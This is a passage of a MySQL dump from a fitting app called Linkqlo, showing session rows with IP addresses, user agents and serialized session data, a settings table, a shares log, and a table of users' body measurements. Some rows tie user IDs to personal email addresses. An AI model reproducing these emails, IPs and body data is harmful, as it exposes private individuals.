('e99fb0c4663031e665869a11ae6a6a93', '54.80.166.99', 'Cloud mapping experiment. Contact research@pdrlabs.net', 1426585688, 'a:6:{s:9:"user_data";s:0:"";s:12:"system_title";s:7:"Linkqlo";s:11:"owner_email";s:17:"admin@linkqlo.com";s:12:"report_email";s:19:"recover@linkqlo.com";s:10:"owner_name";s:5:"Owner";s:13:"contact_email";s:19:"enquiry@linkqlo.com";}'),
('e9c35df8c5613ccd7ec1eeb2c52eb023', '61.240.144.67', 'masscan/1.0 (https://github.com/robertdavidgraham/masscan)', 1427004430, 'a:6:{s:9:"user_data";s:0:"";s:12:"system_title";s:7:"Linkqlo";s:11:"owner_email";s:17:"admin@linkqlo.com";s:12:"report_email";s:19:"recover@linkqlo.com";s:10:"owner_name";s:5:"Owner";s:13:"contact_email";s:19:"enquiry@linkqlo.com";}'),
('e9cb0e30c998c5cd1abba4a625785be5', '54.198.32.175', 'Cloud mapping experiment. Contact research@pdrlabs.net', 1427399178, 'a:6:{s:9:"user_data";s:0:"";s:12:"system_title";s:7:"Linkqlo";s:11:"owner_email";s:17:"admin@linkqlo.com";s:12:"report_email";s:19:"recover@linkqlo.com";s:10:"owner_name";s:5:"Owner";s:13:"contact_email";s:19:"enquiry@linkqlo.com";}'),
('ea79aac72b99006e9131c4bc78794140', '182.118.53.149', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36', 1426720687, 'a:6:{s:9:"user_data";s:0:"";s:12:"system_title";s:7:"Linkqlo";s:11:"owner_email";s:17:"admin@linkqlo.com";s:12:"report_email";s:19:"recover@linkqlo.com";s:10:"owner_name";s:5:"Owner";s:13:"contact_email";s:19:"enquiry@linkqlo.com";}'),
('eb2105f83ede280949e390cd3f7a8f82', '123.155.155.191', 'Linkqlo 1.0 rv:0003 (iPhone; iPhone OS 8.1.2; en_US)', 1426636801, 'a:10:{s:9:"user_data";s:0:"";s:12:"system_title";s:7:"Linkqlo";s:11:"owner_email";s:17:"admin@linkqlo.com";s:12:"report_email";s:19:"recover@linkqlo.com";s:10:"owner_name";s:5:"Owner";s:13:"contact_email";s:19:"enquiry@linkqlo.com";s:7:"user_id";s:1:"7";s:13:"email_address";s:22:"herbert.yang@gmail.com";s:4:"role";s:1:"0";s:8:"loggedin";i:1;}'),
('eba4bc6886c3f840493f85aba11d0635', '182.118.45.217', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36', 1426203595, 'a:6:{s:9:"user_data";s:0:"";s:12:"system_title";s:7:"Linkqlo";s:11:"owner_email";s:17:"admin@linkqlo.com";s:12:"report_email";s:19:"recover@linkqlo.com";s:10:"owner_name";s:5:"Owner";s:13:"contact_email";s:19:"enquiry@linkqlo.com";}'),
('ebb59831eefe347dfa7b6ee94ee89472', '54.67.75.51', 'Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1', 1426989008, 'a:6:{s:9:"user_data";s:0:"";s:12:"system_title";s:7:"Linkqlo";s:11:"owner_email";s:17:"admin@linkqlo.com";s:12:"report_email";s:19:"recover@linkqlo.com";s:10:"owner_name";s:5:"Owner";s:13:"contact_email";s:19:"enquiry@linkqlo.com";}'),
('ec3046fd6b44a25c26cb965892b5089b', '141.212.122.98', '0', 1427077932, 'a:6:{s:9:"user_data";s:0:"";s:12:"system_title";s:7:"Linkqlo";s:11:"owner_email";s:17:"admin@linkqlo.com";s:12:"report_email";s:19:"recover@linkqlo.com";s:10:"owner_name";s:5:"Owner";s:13:"contact_email";s:19:"enquiry@linkqlo.com";}'),
('ecb4444a04435b74732162cc6bbd4fd3', '61.240.144.67', 'masscan/1.0 (https://github.com/robertdavidgraham/masscan)', 1426098850, 'a:6:{s:9:"user_data";s:0:"";s:12:"system_title";s:7:"Linkqlo";s:11:"owner_email";s:17:"admin@linkqlo.com";s:12:"report_email";s:19:"recover@linkqlo.com";s:10:"owner_name";s:5:"Owner";s:13:"contact_email";s:19:"enquiry@linkqlo.com";}'),
('f013aa520eae0a6721b6e2d42c0d848e', '188.138.17.205', '0', 1426596739, 'a:6:{s:9:"user_data";s:0:"";s:12:"system_title";s:7:"Linkqlo";s:11:"owner_email";s:17:"admin@linkqlo.com";s:12:"report_email";s:19:"recover@linkqlo.com";s:10:"owner_name";s:5:"Owner";s:13:"contact_email";s:19:"enquiry@linkqlo.com";}'),
('f0b49723f2a0c8b3547d5ad7d31a7f16', '222.65.122.72', 'Linkqlo 1.1 rv:0003 (iPhone; iPhone OS 8.1.2; zh_CN)', 1426993639, 'a:9:{s:9:"user_data";s:0:"";s:12:"system_title";s:7:"Linkqlo";s:11:"owner_email";s:17:"admin@linkqlo.com";s:12:"report_email";s:19:"recover@linkqlo.com";s:10:"owner_name";s:5:"Owner";s:13:"contact_email";s:19:"enquiry@linkqlo.com";s:7:"user_id";s:3:"141";s:4:"role";s:1:"0";s:8:"loggedin";i:1;}'),
('f15a2b15e86ee7d7997f154cbebd3a05', '67.188.213.217', 'Linkqlo 1.1 rv:0003 (iPhone; iPhone OS 8.2; en_US)', 1427569311, 'a:9:{s:9:"user_data";s:0:"";s:12:"system_title";s:7:"Linkqlo";s:11:"owner_email";s:17:"admin@linkqlo.com";s:12:"report_email";s:19:"recover@linkqlo.com";s:10:"owner_name";s:5:"Owner";s:13:"contact_email";s:19:"enquiry@linkqlo.com";s:7:"user_id";s:3:"181";s:4:"role";s:1:"0";s:8:"loggedin";i:1;}'),
('f2bd4ba801ef95a10e99b6d4f9e355c6', '58.5.229.220', 'Linkqlo 1.1 rv:0003 (iPhone; iPhone OS 8.2; ja_JP)', 1427638498, 'a:9:{s:9:"user_data";s:0:"";s:12:"system_title";s:7:"Linkqlo";s:11:"owner_email";s:17:"admin@linkqlo.com";s:12:"report_email";s:19:"recover@linkqlo.com";s:10:"owner_name";s:5:"Owner";s:13:"contact_email";s:19:"enquiry@linkqlo.com";s:7:"user_id";s:3:"172";s:4:"role";s:1:"0";s:8:"loggedin";i:1;}'),
('f325f467c2b9d8ccd978fe585c1492d5', '76.102.40.34', 'Linkqlo 1.1 rv:0003 (iPhone; iPhone OS 8.1.3; en_US)', 1427351390, 'a:9:{s:9:"user_data";s:0:"";s:12:"system_title";s:7:"Linkqlo";s:11:"owner_email";s:17:"admin@linkqlo.com";s:12:"report_email";s:19:"recover@linkqlo.com";s:10:"owner_name";s:5:"Owner";s:13:"contact_email";s:19:"enquiry@linkqlo.com";s:7:"user_id";s:2:"10";s:4:"role";s:1:"0";s:8:"loggedin";i:1;}'),
('f4a7a7c2da8b3a7b16d397fd371200a8', '54.227.19.169', 'revolt', 1427104277, 'a:6:{s:9:"user_data";s:0:"";s:12:"system_title";s:7:"Linkqlo";s:11:"owner_email";s:17:"admin@linkqlo.com";s:12:"report_email";s:19:"recover@linkqlo.com";s:10:"owner_name";s:5:"Owner";s:13:"contact_email";s:19:"enquiry@linkqlo.com";}'),
('f4f07b8e2784a7fbe9ee08c84fd03725', '1.234.45.181', '0', 1426912468, 'a:6:{s:9:"user_data";s:0:"";s:12:"system_title";s:7:"Linkqlo";s:11:"owner_email";s:17:"admin@linkqlo.com";s:12:"report_email";s:19:"recover@linkqlo.com";s:10:"owner_name";s:5:"Owner";s:13:"contact_email";s:19:"enquiry@linkqlo.com";}'),
('f4f5fc295b3ec1ddf67566867e9f5d8f', '50.141.81.38', 'Linkqlo 1.1 rv:0003 (iPhone; iPhone OS 8.1.2; en_US)', 1427033672, 'a:9:{s:9:"user_data";s:0:"";s:12:"system_title";s:7:"Linkqlo";s:11:"owner_email";s:17:"admin@linkqlo.com";s:12:"report_email";s:19:"recover@linkqlo.com";s:10:"owner_name";s:5:"Owner";s:13:"contact_email";s:19:"enquiry@linkqlo.com";s:7:"user_id";s:3:"158";s:4:"role";s:1:"0";s:8:"loggedin";i:1;}'),
('f697604e819dc01a3ff9c7413c27c9bf', '124.248.212.236', 'Linkqlo 1.0 rv:0003 (iPhone; iPhone OS 8.2; en_CN)', 1427264733, 'a:10:{s:9:"user_data";s:0:"";s:12:"system_title";s:7:"Linkqlo";s:11:"owner_email";s:17:"admin@linkqlo.com";s:12:"report_email";s:19:"recover@linkqlo.com";s:10:"owner_name";s:5:"Owner";s:13:"contact_email";s:19:"enquiry@linkqlo.com";s:7:"user_id";s:1:"1";s:13:"email_address";s:15:"han@linkqlo.com";s:4:"role";s:1:"0";s:8:"loggedin";i:1;}'),
('f77261bf76feba20c60b83c8ea2ec44d', '85.18.173.109', '0', 1426351471, 'a:6:{s:9:"user_data";s:0:"";s:12:"system_title";s:7:"Linkqlo";s:11:"owner_email";s:17:"admin@linkqlo.com";s:12:"report_email";s:19:"recover@linkqlo.com";s:10:"owner_name";s:5:"Owner";s:13:"contact_email";s:19:"enquiry@linkqlo.com";}'),
('f89bdb524e5631bc0f78259378c9252d', '74.208.201.50', 'curl/7.19.7 (x86_64-redhat-linux-gnu) libcurl/7.19.7 NSS/3.16.2.3 Basic ECC zlib/1.2.3 libidn/1.18 libssh2/1.4.2', 1427550680, 'a:6:{s:9:"user_data";s:0:"";s:12:"system_title";s:7:"Linkqlo";s:11:"owner_email";s:17:"admin@linkqlo.com";s:12:"report_email";s:19:"recover@linkqlo.com";s:10:"owner_name";s:5:"Owner";s:13:"contact_email";s:19:"enquiry@linkqlo.com";}'),
('fac96dbe67ebc230c4a2090b1694081d', '61.240.144.64', 'masscan/1.0 (https://github.com/robertdavidgraham/masscan)', 1426325399, 'a:6:{s:9:"user_data";s:0:"";s:12:"system_title";s:7:"Linkqlo";s:11:"owner_email";s:17:"admin@linkqlo.com";s:12:"report_email";s:19:"recover@linkqlo.com";s:10:"owner_name";s:5:"Owner";s:13:"contact_email";s:19:"enquiry@linkqlo.com";}'),
('fcb389b605ca651465d99325a0e07432', '98.234.249.86', 'curl/7.22.0 (x86_64-pc-linux-gnu) libcurl/7.22.0 OpenSSL/1.0.1 zlib/1.2.3.4 libidn/1.23 librtmp/2.3', 1427428932, 'a:6:{s:9:"user_data";s:0:"";s:12:"system_title";s:7:"Linkqlo";s:11:"owner_email";s:17:"admin@linkqlo.com";s:12:"report_email";s:19:"recover@linkqlo.com";s:10:"owner_name";s:5:"Owner";s:13:"contact_email";s:19:"enquiry@linkqlo.com";}');

-- --------------------------------------------------------

--
-- Table structure for table `settings`
--

CREATE TABLE IF NOT EXISTS `settings` (
`id` int(15) NOT NULL,
  `option_key` varchar(100) NOT NULL,
  `option_value` varchar(1024) NOT NULL,
  `module` varchar(20) DEFAULT NULL
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 CHECKSUM=1 DELAY_KEY_WRITE=1 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=6 ;

--
-- Dumping data for table `settings`
--

INSERT INTO `settings` (`id`, `option_key`, `option_value`, `module`) VALUES
(1, 'system_title', 'Linkqlo', 'system'),
(2, 'owner_email', 'admin@linkqlo.com', 'system'),
(3, 'report_email', 'recover@linkqlo.com', 'system'),
(4, 'owner_name', 'Owner', 'system'),
(5, 'contact_email', 'enquiry@linkqlo.com', 'system');

-- --------------------------------------------------------

--
-- Table structure for table `shares`
--

CREATE TABLE IF NOT EXISTS `shares` (
`share_id` int(11) NOT NULL,
  `post_id` int(11) DEFAULT NULL,
  `user_id` int(11) DEFAULT NULL,
  `created` datetime DEFAULT NULL
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=19 ;

--
-- Dumping data for table `shares`
--

INSERT INTO `shares` (`share_id`, `post_id`, `user_id`, `created`) VALUES
(1, 5, 10, '2015-03-17 04:50:32'),
(2, 5, 147, '2015-03-19 00:49:16'),
(3, 3, 49, '2015-03-21 00:04:38'),
(4, 8, 21, '2015-03-21 01:02:50'),
(5, 13, 10, '2015-03-22 00:57:32'),
(6, 39, 10, '2015-03-24 17:04:16'),
(7, 30, 10, '2015-03-24 17:04:49'),
(8, 25, 10, '2015-03-25 02:57:32'),
(9, 46, 10, '2015-03-25 02:58:08'),
(10, 48, 21, '2015-03-25 04:17:23'),
(11, 60, 10, '2015-03-25 17:11:42'),
(12, 61, 10, '2015-03-25 19:38:47'),
(13, 67, 10, '2015-03-26 00:22:24'),
(14, 76, 10, '2015-03-26 17:12:49'),
(15, 77, 10, '2015-03-26 21:20:59'),
(16, 94, 21, '2015-03-28 14:22:21'),
(17, 94, 10, '2015-03-28 17:52:58'),
(18, 89, 10, '2015-03-28 18:03:04');

-- --------------------------------------------------------

--
-- Table structure for table `specs`
--

CREATE TABLE IF NOT EXISTS `specs` (
`spec_id` int(11) NOT NULL,
  `user_id` int(11) DEFAULT NULL,
  `unit` decimal(10,2) DEFAULT '0.00',
  `height` decimal(10,2) DEFAULT '0.00',
  `weight` decimal(10,2) DEFAULT '0.00',
  `chest` decimal(10,2) DEFAULT '0.00',
  `waist` decimal(10,2) DEFAULT '0.00',
  `cup_size` decimal(10,2) DEFAULT '0.00',
  `hip` decimal(10,2) DEFAULT '0.00',
  `foot` decimal(10,2) DEFAULT '0.00',
  `neck` decimal(10,2) DEFAULT '0.00',
  `shoulder` decimal(10,2) DEFAULT '0.00',
  `arm_length` decimal(10,2) DEFAULT '0.00',
  `upper_arm_size` decimal(10,2) DEFAULT '0.00',
  `torso_height` decimal(10,2) DEFAULT '0.00',
  `belly` decimal(10,2) DEFAULT '0.00',
  `thigh` decimal(10,2) DEFAULT '0.00',
  `leg_length` decimal(10,2) DEFAULT '0.00',
  `calf` decimal(10,2) DEFAULT '0.00',
  `last_changed` datetime NOT NULL
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=174 ;

--
-- Dumping data for table `specs`
--

INSERT INTO `specs` (`spec_id`, `user_id`, `unit`, `height`, `weight`, `chest`, `waist`, `cup_size`, `hip`, `foot`, `neck`, `shoulder`, `arm_length`, `upper_arm_size`, `torso_height`, `belly`, `thigh`, `leg_length`, `calf`, `last_changed`) VALUES
(1, 1, 0.00, 162.00, 56.00, 84.00, 70.99, 0.00, 94.01, 23.11, 31.50, 41.00, 73.00, 30.00, 40.01, 90.50, 54.00, 94.01, 36.50, '0000-00-00 00:00:00'),
(2, 2, 0.00, 162.00, 56.00, 84.00, 70.99, 0.00, 94.01, 23.01, 31.50, 41.00, 73.00, 30.00, 40.01, 90.50, 54.00, 94.01, 36.50, '0000-00-00 00:00:00'),
(3, 3, 0.00, 185.00, 78.00, 122.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(4, 6, 0.00, 166.00, 62.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(5, 4, 0.00, 178.00, 72.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(6, 8, 0.00, 145.00, 25.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(7, 17, 0.00, 156.00, 45.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(9, 11, 0.00, 182.00, 82.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(10, 7, 0.00, 161.29, 90.72, 100.33, 93.98, 0.00, 100.33, 26.67, 43.18, 48.26, 63.50, 35.56, 49.53, 93.98, 63.50, 99.06, 43.18, '0000-00-00 00:00:00'),
(11, 13, 0.00, 170.00, 60.78, 91.44, 81.28, 0.00, 91.44, 24.13, 76.20, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(12, 19, 0.00, 174.00, 76.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(13, 20, 0.00, 163.00, 63.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(14, 24, 0.00, 159.00, 48.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(15, 25, 0.00, 168.00, 69.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(16, 26, 0.00, 172.00, 61.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(17, 27, 0.00, 155.00, 50.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(18, 28, 0.00, 192.00, 99.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(19, 29, 0.00, 174.00, 89.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(20, 30, 0.00, 170.00, 62.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(21, 10, 0.00, 176.00, 88.45, 100.33, 93.98, 0.00, 100.33, 26.67, 43.18, 48.26, 63.50, 35.56, 49.53, 93.98, 63.50, 99.06, 43.18, '2015-03-26 05:23:14'),
(22, 21, 0.00, 159.00, 55.00, 86.36, 71.12, 0.00, 95.25, 23.50, 31.12, 39.37, 53.34, 28.58, 39.37, 73.66, 57.15, 97.79, 39.37, '2015-03-26 07:43:03'),
(23, 31, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(24, 32, 0.00, 160.00, 47.63, 74.93, 69.85, 0.00, 86.36, 21.59, 30.48, 40.64, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '2015-03-22 04:20:07'),
(25, 33, 0.00, 168.00, 64.00, 91.44, 81.28, 0.00, 91.44, 25.00, 35.56, 45.72, 73.66, 30.48, 50.80, 81.28, 50.80, 81.28, 33.02, '0000-00-00 00:00:00'),
(26, 34, 0.00, 190.50, 81.19, 0.00, 86.36, 0.00, 0.00, 26.67, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(27, 35, 0.00, 162.00, 49.00, 84.00, 71.00, 0.00, 93.98, 23.00, 31.50, 41.00, 73.00, 29.97, 40.00, 80.52, 54.00, 93.98, 36.32, '0000-00-00 00:00:00'),
(28, 36, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(29, 37, 0.00, 182.00, 67.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(30, 38, 0.00, 177.80, 429.90, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(31, 39, 0.00, 182.00, 85.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(32, 40, 0.00, 172.00, 63.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(33, 41, 0.00, 174.00, 68.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(34, 42, 0.00, 168.00, 64.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(35, 43, 0.00, 170.00, 293.21, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(36, 44, 0.00, 177.80, 440.92, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(37, 45, 0.00, 160.02, 209.44, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(38, 46, 0.00, 165.00, 46.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(39, 47, 0.00, 172.72, 295.42, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(40, 48, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(41, 49, 0.00, 180.34, 73.94, 95.25, 83.82, 0.00, 93.98, 25.40, 38.10, 52.07, 83.82, 39.37, 66.04, 86.36, 58.42, 90.17, 39.37, '0000-00-00 00:00:00'),
(42, 50, 0.00, 170.00, 297.62, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(43, 51, 0.00, 176.00, 429.90, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(44, 52, 0.00, 177.80, 429.90, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(45, 53, 0.00, 177.80, 429.90, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(46, 54, 0.00, 170.00, 297.62, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(47, 55, 0.00, 176.00, 418.88, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(48, 56, 0.00, 174.00, 57.00, 83.00, 69.00, 0.00, 91.00, 39.00, 0.00, 39.00, 56.00, 0.00, 0.00, 0.00, 0.00, 109.00, 0.00, '0000-00-00 00:00:00'),
(49, 57, 0.00, 185.00, 110.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(50, 58, 0.00, 157.48, 45.36, 86.36, 63.50, 0.00, 88.90, 22.86, 30.48, 38.10, 52.07, 22.86, 0.00, 73.66, 48.26, 78.74, 30.48, '0000-00-00 00:00:00'),
(51, 59, 0.00, 160.02, 47.63, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(52, 60, 0.00, 174.00, 57.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(53, 61, 0.00, 170.00, 295.42, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(54, 62, 0.00, 175.00, 78.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(55, 63, 0.00, 160.02, 231.49, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(56, 64, 0.00, 160.02, 231.49, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(57, 65, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(58, 66, 0.00, 165.00, 60.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(59, 67, 0.00, 175.00, 200.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(60, 68, 0.00, 175.26, 81.65, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(61, 69, 0.00, 175.01, 83.92, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(62, 70, 0.00, 175.26, 83.92, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(63, 71, 0.00, 177.00, 83.92, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(64, 72, 0.00, 166.00, 52.00, 0.00, 64.00, 0.00, 0.00, 37.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(65, 73, 0.00, 16.00, 52.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(66, 74, 0.00, 177.80, 86.20, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(67, 75, 0.00, 177.80, 86.18, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(68, 76, 0.00, 177.80, 86.20, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(69, 77, 0.00, 431.80, 61.23, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(70, 78, 0.00, 177.80, 86.18, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(71, 79, 0.00, 177.80, 86.18, 127.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(72, 80, 0.00, 178.00, 70.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(73, 81, 0.00, 163.00, 58.00, 91.00, 66.00, 0.00, 91.00, 23.00, 65.00, 28.00, 55.00, 28.00, 48.00, 70.00, 45.00, 96.00, 37.00, '0000-00-00 00:00:00'),
(74, 82, 0.00, 177.80, 83.91, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
